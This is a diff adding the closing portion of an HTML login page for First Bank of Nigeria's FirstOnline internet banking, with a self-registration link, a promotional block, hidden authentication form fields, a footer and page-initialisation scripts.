+<span  id="LoginHDisplay.Ra18.C1"  class="goto_loginpagebtnCust"><span class="simpletext" id="span_Caption24477412211"title = "Register for Personal Banking" ><a  href="AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&amp;__START_TRAN_FLAG__=Y&amp;__EVENT_ID__=LOAD&amp;ACTION.LOAD=Y&amp;__CALL_MODE__=52&amp;AuthenticationFG.LOGIN_FLAG=1&amp;BANK_ID=01&amp;LANGUAGE_ID=001" title = "Register for Personal Banking" id="Caption24477412211" name = "HREF_Caption24477412211"  target = "_blank">Self-Registration</a></span></span>
+                                                </p>
+
+
+                                                </small>
+                                                </p>
+                                            </div>
+
+                                        </form>
+
+                                    </div>
+                                    <!--skew-inner-->
+
+                                </div>
+                                <!--skew-inner-->
+
+                            </div>
+                            <!--skew-inner-->
+                            <div class="skew-baseCust">
+                                <div class="skew-base-inner">
+                                    <div class="col-sm-12">
+                                        <div class="media">
+                                            <div class="col-sm-3"><a class="media-left" href="#">
+						<img class="media-object" src="L001/consumer/images/bulb.png" alt="Speed of light">
+					</a></div>
+                                            <div class="col-sm-9">
+                                                <div class="media-body">
+                                                    <p>Make <strong>multiple transfers</strong> in one transaction with <strong>FirstOnline</strong></p>
+
+                                                </div>
+                                                <a href="https://www.firstbanknigeria.com/personal-banking/ways-to-bank/online-banking/firstonline/firstonline-help-and-faqs/" target="_blank" class="pull-right">Learn More</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!--skew-inner-->
+                        </div>
+                        <!--changes for UI -END-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                        <p id="LoginHDisplay.Ra27" class="loginrow">
+                            <span id="LoginHDisplay.Ra27.C1"><img src="L001/consumer/images/imgDividerLine.png?mtime=1481399733000" alt="Divider Image" title="Divider Image" class="loginPanelImageDividerStyle"  id="dividerImage1"border="0" /></span></p>
+
+
+
+
+
+
+
+
+
+
+
+                        <p id="LoginHDisplay.Ra28" class="loginPanelLeftPaddingStyle">
+                            <span id="LoginHDisplay.Ra28.C2" class="loginPanelLeftPaddingStyle1"><input  type="Submit" name="Action.FEDERATED_LOGIN_REDIRECT" class="displayNone" id="FEDERATED_LOGIN_REDIRECT" value="."/></span></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+
+                <div class="width100percent" id="Details_TopLeftContainer_Stage3_ModalView1">
+                    <div id="Details_TopLeftContainer_Stage3_ModalView1.SubSectionSet1" class="width100percent">
+                        <!--start of subsection-->
+                        <div id="Details_TopLeftContainer_Stage3_ModalView1.SubSection1" class="width100percent">
+
+
+
+
+
+
+
+                        </div>
+                        <!--end of subsection-->
+                        <!--start of subsection-->
+                        <div id="Details_TopLeftContainer_Stage3_ModalView1.SubSection2" class="width100percent">
+
+
+
+
+
+
+
+
+
+
+                        </div>
+                        <!--end of subsection-->
+                        <!--start of subsection-->
+                        <div id="Details_TopLeftContainer_Stage3_ModalView1.SubSection3" class="width100percent">
+
+
+
+
+
+
+
+
+
+
+                        </div>
+                        <!--end of subsection-->
+                    </div>
+
+                </div>
+
+                <input type="Hidden" name="FG_BUTTONS__" value="VALIDATE_CREDENTIALS,STU_VALIDATE_CREDENTIALS,VALIDATE_CREDENTIALS_DIG_CERT,BACK,CLEAR_VALUES" id="FGBUTTONS" />
+                <input type="Hidden" name="AuthenticationFG.IS_FIRST_AUTHENTICATION" value="Y" id="AuthenticationFG.ISFIRSTAUTHENTICATION" />
+                <input type="Hidden" name="QS" value="" id="QS" />
+                <input type="Hidden" name="USER_ID_COOKIE" value="" id="USER_ID_COOKIE" />
+                <input type="Hidden" name="CATEGORY_ID" value="" id="CATEGORYID" />
+                <input type="Hidden" name="AuthenticationFG.PREFERRED_LANGUAGE" value="001" id="AuthenticationFG.PREFERREDLANGUAGE" />
+                <input type="Hidden" name="AuthenticationFG.PREFERRED_LANGUAGE" value="NG" id="AuthenticationFG.COUNTRY" />
+                <input type="Hidden" name="userType" value="1" id="userType" />
+                <input type="Hidden" name="bankId" value="01" id="bankId" />
+                <input type="Hidden" name="languageId" value="001" id="languageId" />
+                <input type="Hidden" name="FORMSGROUP_ID__" value="AuthenticationFG" id="FORMSGROUP_ID__" />
+                <input type="Hidden" name="AuthenticationFG.REPORTTITLE" value="AuthenticationScreen" id="AuthenticationFG.REPORTTITLE" />
+
+
+
+
+
+                <!-- This div is closed conditionally If developer has not included sidebar jsp through dppdl then this div never gets closed and formed html is wrong
+for this a flag is set in sidebar jsp where parenttable div formed in parentTable jsp is closed and if that flag is null means sidebar jsp is not included then close the corresponsing div in footer -->
+            </div>
+
+
+
+
+
+
+            <input type="Hidden" name="counterPartyNickName" value="" id="counterPartyNickName" />
+
+            <input type="Hidden" name="amountSendToCxps" value="" id="amountSendToCxps" />
+
+            <input type="Hidden" name="counterPartyTpe" value="" id="counterPartyTpe" />
+
+            <input type="Hidden" name="freqTyp" value="" id="freqTyp" />
+
+            <input type="Hidden" name="tranType" value="" id="tranType" />
+            <input type="Hidden" name="bankId" value="01" id="bankId" />
+            <input type="Hidden" name="cxpsUserId" value="" id="cxpsUserId" />
+            <input type="Hidden" name="corpId" value="" id="corpId" />
+            <input type="Hidden" name="usertype" value="1" id="usertype" />
+            <input type="Hidden" name="RECEIVED_RESPONSE" value="" id="RECEIVED_RESPONSE" />
+
+
+
+
+
+
+
+            <div id="CrossSellContainer"></div>
+        </div>
+
+
+
+
+
+
+
+        <div id="footer" role="contentinfo">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <div id="footerInner">
+
+
+
+                <p class="simpletext center"><span>Copyright &copy; 2018. First Bank of Nigeria Ltd. All Rights Reserved 
+			</span>
+                    <!-- 			<p class="simpletext">Powered By -->
+                    <!-- 			<span class="footer_secondLine"> -->
+
+
+                    <!-- 			</span> -->
+                    <!-- 			</p> -->
+
+
+
+            </div>
+
+
+
+
+
+        </div>
+
+        <div id="footer-line" class="footer_line"><img src="L001/consumer/images/trans.gif"></div>
+
+
+        </div>
+
+        </div>
+
+
+
+        <input type="Hidden" name="ENABLE_CXPS" value="Y" id="ENABLE_CXPS" />
+        <input type="Hidden" name="CXPS_ENABLE_JS_FLOW" value="N" id="CXPS_ENABLE_JS_FLOW" />
+
+
+
+
+        <script type="text/javascript">
+            jQuery(document).ready(function() {
+                var dd = document.getElementsByClassName("labelColumn");
+                dd[1].removeAttribute('class');
+                dd[0].removeAttribute('class');
+
+                jQuery('.fa-repeat').click(function() {
+                    jQuery('#CHANGE_IMAGECAPTCHA').click();
+                });
+            });
+        </script>
+
+        <input type="Hidden" name="RIA_TARGETS" value="" id="RIA_TARGETS" /><input type="Hidden" name="JS_ENABLED_FLAG" value="N" id="JS_ENABLED_FLAG" /><input type="Hidden" name="DECRYPT_FLAG" value="N" id="DECRYPT_FLAG" /><input type="Hidden" name="CHECKBOX_NAMES__"
+            value="" id="CHECKBOX_NAMES__" /><input type="Hidden" name="Requestid" value="1" id="Requestid" />
+        <script type="text/javascript">
+            feba.js.common.checkJS("JS_ENABLED_FLAG");
+        </script>
+        <script type="text/javascript">
+            jsVarForControlIds = "AuthenticationFG.USER_PRINCIPAL=User ID@@Verification=AuthenticationFG.VERIFICATION_CODE@@AuthenticationFG.VERIFICATION_CODE=Verification@@User ID=AuthenticationFG.USER_PRINCIPAL@@"
+        </script>
+        <script type="text/javascript">
+            jQuery(function() {
+                RedrawAllTrees();
+                jsonObj = {
+                    "TypesCatalogue": {
+                        "UserPrincipal": {
+                            "LEN": "65",
+                            "JUS": "LEFT_JUSTIFIED",
+                            "CST": "MIXED_CASE",
+                            "CNT": "null",
+                            "SEC": "false",
+                            "BCC": "false",
+                            "PTY": "STR"
+                        },
+                        "FEBAUnboundString": {
+                            "LEN": "-1",
+                            "JUS": "LEFT_JUSTIFIED",
+                            "CST": "MIXED_CASE",
+                            "CNT": "null",
+                            "SEC": "false",
+                            "BCC": "false",
+                            "PTY": "STR"
+                        }
+                    }
+                };
+                init(jsonObj, null, jsVarForControlIds);
+                feba.js.common.blockOnButtonClicks("loadingImage");
+                feba.js.common.blockOnHyperlinkClicks("loadingImage");
+                feba.js.common.runPageCustomFunction("AuthenticationScreen_onload", "null");
+                feba.js.common.runModuleCustomFunction("user_onload", "null");
+            });
+        </script><img src="L001/consumer/images/widget-loading.gif" id="loadingImage" style="display:none;" /></form>
+</body>
+
+</html>
